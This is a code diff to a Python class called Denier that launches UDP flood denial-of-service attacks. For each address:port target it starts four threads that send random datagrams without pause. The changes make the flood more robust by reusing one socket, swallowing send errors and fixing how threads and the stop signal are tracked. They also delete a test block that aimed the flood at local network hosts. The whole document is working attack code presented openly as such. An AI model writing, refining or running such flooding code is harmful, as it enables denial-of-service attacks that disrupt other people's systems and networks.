@@ -56,7 +56,7 @@ class Denier:
 			if target not in self.targets and len(target) > 0 and len(target.split(":")) == 2:
 				try:
 					self._start(target)
-				except:
+				except Exception:
 					self.buffer.put("dos",f"Error while starting DoS attack on {target}")
 			else:
 				self.buffer.put("dos", f"Did not start DoS attack on \"{target}\"")
@@ -72,24 +72,33 @@ class Denier:
 
 			address = target.split(":")[0]
 			port = int(target.split(":")[1])
-			while not self.targets[target]["stop_event"].is_set():	
+			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			try:
+				while not self.targets[target]["stop_event"].is_set():
 
-				rnd_msg = ""
-				for i in range(0, 8):
-					ch_rnd = random.randint(0, 255)
-					rnd_msg += chr(ch_rnd)
-				message = str.encode(rnd_msg)
-				sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-				sock.sendto(message, (address, port))
-			# Job stopped
+					rnd_msg = ""
+					for i in range(0, 8):
+						ch_rnd = random.randint(0, 255)
+						rnd_msg += chr(ch_rnd)
+					message = str.encode(rnd_msg)
+					try:
+						sock.sendto(message, (address, port))
+					except OSError:
+						pass
+				# Job stopped
+			finally:
+				sock.close()
 
-		# create threads
+		# create threads - the target's dict entry (and its stop_event) is created
+		# once before spawning, not per-thread, so all 4 threads share one
+		# stop_event/threads list instead of each iteration silently discarding
+		# the threads tracked by the previous one.
 		number_of_attacks = 4
+		self.targets[target] = {
+			"stop_event": threading.Event(),
+			"threads": []
+		}
 		for i in range(number_of_attacks):
-			self.targets[target] = {
-				"stop_event": threading.Event(),
-				"threads": []
-			}
 			t = threading.Thread(target=job, args=(target, i), daemon=True)
 			self.targets[target]["threads"].append(t)
 			t.start()
@@ -122,23 +131,4 @@ class Denier:
 			t.join(timeout=1)
 
 		self.buffer.put("dos", f"Stopped DoS attack on {target}")
-
-
-if __name__ == "__main__":
-	
-	class Buffer:
-		def __init__(self):
-			...
-
-		def put(self, s, t, r):
-			print(r)
-	buffer = Buffer()
-	dos = Denier(buffer)
-
-	target = input("Type ip - system76: 114, asus: 231")
-	dos.start([f"192.168.8.{target}:200"])
-
-	input("Press enter to stop")
-
-	dos.stop()
 
